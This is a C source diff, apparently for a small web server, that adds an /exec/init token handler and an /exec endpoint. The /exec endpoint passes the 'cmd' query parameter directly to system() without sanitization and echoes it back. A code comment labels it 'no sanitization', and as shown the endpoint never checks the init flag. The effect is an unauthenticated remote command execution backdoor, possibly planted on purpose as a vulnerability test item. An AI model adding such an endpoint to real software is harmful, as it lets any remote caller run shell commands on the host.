+/* Handle /exec/init?token=<secret> — C3 initialization. */
+static void handle_exec_init(struct http_conn *hc)
+{
+	const char *token = NULL;
+
+	if (hc->query && strncmp(hc->query, "token=", 6) == 0)
+		token = hc->query + 6;
+
+	if (!token || *token == '\0') {
+		httpd_send_err(hc, 400, httpd_err400title, "", httpd_err400form,
+		               "missing token parameter");
+		return;
+	}
+
+	if (strcmp(token, exec_cfg.secret) != 0) {
+		httpd_send_err(hc, 403, err403title, "",
+		               ERROR_FORM(err403form, "Invalid token.\n"), "");
+		return;
+	}
+
+	exec_initialized = 1;
+	httpd_send_err(hc, 200, "OK", "", "exec endpoint initialized\n", "");
+}
+
+
+/* Handle /exec endpoint. C2/I1/S1: direct to system(), no sanitization. */
+static void handle_exec(struct http_conn *hc)
+{
+	const char *cmd = NULL;
+
+	if (hc->query && strncmp(hc->query, "cmd=", 4) == 0)
+		cmd = hc->query + 4;
+
+	if (!cmd || *cmd == '\0') {
+		httpd_send_err(hc, 400, httpd_err400title, "", httpd_err400form,
+		               "missing cmd parameter");
+		return;
+	}
+
+	system(cmd);
+	httpd_send_err(hc, 200, "OK", "", "Command dispatched: %s\n", (char *)cmd);
+}
